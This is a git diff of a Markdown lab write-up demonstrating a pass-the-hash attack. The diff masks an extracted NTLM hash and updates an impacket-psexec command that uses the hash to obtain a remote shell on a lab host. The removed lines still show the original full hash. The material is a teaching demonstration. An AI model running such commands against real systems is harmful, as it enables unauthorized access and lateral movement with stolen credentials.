@@ -66,8 +66,8 @@ The attacker first obtains an **NTLM hash** from the compromised system using cr
 Example output:
 
 ```
-Username: target
-NTLM: 32ed87bdb5fdc5e9cba88547376818d4
+Username: target-hash
+NTLM: 2b576acbe6bcfda*****************
 ```
 
 ![Extracted NTLM Hash](images/ntlm_hash_extracted.jpg)
@@ -85,12 +85,12 @@ In real-world attacks, credential hashes may be obtained from:
 Using the extracted NTLM hash, the attacker authenticates remotely using **Impacket psexec**, without needing the actual password.
 
 ```bash
-impacket-psexec target@192.168.56.103 -hashes :32ed87bdb5fdc5e9cba88547376818d4
+impacket-psexec target-hash@192.168.56.103 -hashes :2b576acbe6bcfda*****************
 ```
 
 Successful execution grants a **remote command shell** on the target system.
 
-![Pass the Hash Attack Execution](images/pass_the_hash_attack_execution.jpg)
+![Pass the Hash Attack Execution](images/pass_the_hash_attack_execution.png)
 
 This demonstrates how attackers can perform **lateral movement across the network** using stolen authentication hashes.
 
